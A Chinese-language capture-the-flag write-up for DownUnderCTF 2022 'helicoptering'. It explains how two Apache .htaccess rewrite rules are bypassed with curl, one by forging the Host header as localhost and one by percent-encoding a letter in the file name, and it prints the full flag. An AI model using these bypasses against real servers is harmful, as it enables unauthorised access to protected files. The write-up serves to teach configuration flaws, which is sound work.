# DownUnderCTF 2022 helicoptering Writeup

## 题目简述

Apache 站点公开说明 flag 被拆成两段，分别位于 `/one/flag.txt` 和 `/two/flag.txt`。两个目录各有一条 `.htaccess` 规则：第一条只允许 `Host` 为 `localhost`，第二条拒绝原始请求中出现字符串 `flag`。目标是利用 HTTP 头和 Apache 变量的解析差异分别绕过。

## 解题过程

第一段的规则是：

```apache
RewriteCond %{HTTP_HOST} !^localhost$
RewriteRule ".*" "-" [F]
```

`HTTP_HOST` 直接来自客户端可控的 `Host` 头，不代表 TCP 连接真实发往本机。对远端地址发送请求时把该头改为 `localhost` 即可：

```bash
curl -H 'Host: localhost' 'http://target/one/flag.txt'
```

响应得到：

```text
DUCTF{thats_it_
```

第二段检查 `%{THE_REQUEST}`：

```apache
RewriteCond %{THE_REQUEST} flag
RewriteRule ".*" "-" [F]
```

`THE_REQUEST` 保存尚未 URL 解码的原始请求行。把文件名中的 `a` 编码成 `%61` 后，原始请求行不含连续的 `flag`，但 Apache 路由文件时会解码为 `flag.txt`：

```bash
curl 'http://target/two/fl%61g.txt'
```

响应得到：

```text
next_time_im_using_nginx}
```

两段拼接后为：

```text
DUCTF{thats_it_next_time_im_using_nginx}
```

## 方法总结

两次绕过分别利用了不同的信任错误：`Host` 是可伪造的应用层字段，不能证明请求来自 localhost；`THE_REQUEST` 又保留原始编码形式，与 Apache 最终访问的解码路径不同。面对重写规则时，应明确每个变量处在“原始请求、规范化路径、路由结果”中的哪一层，而不是只比较浏览器地址栏中的字符串。
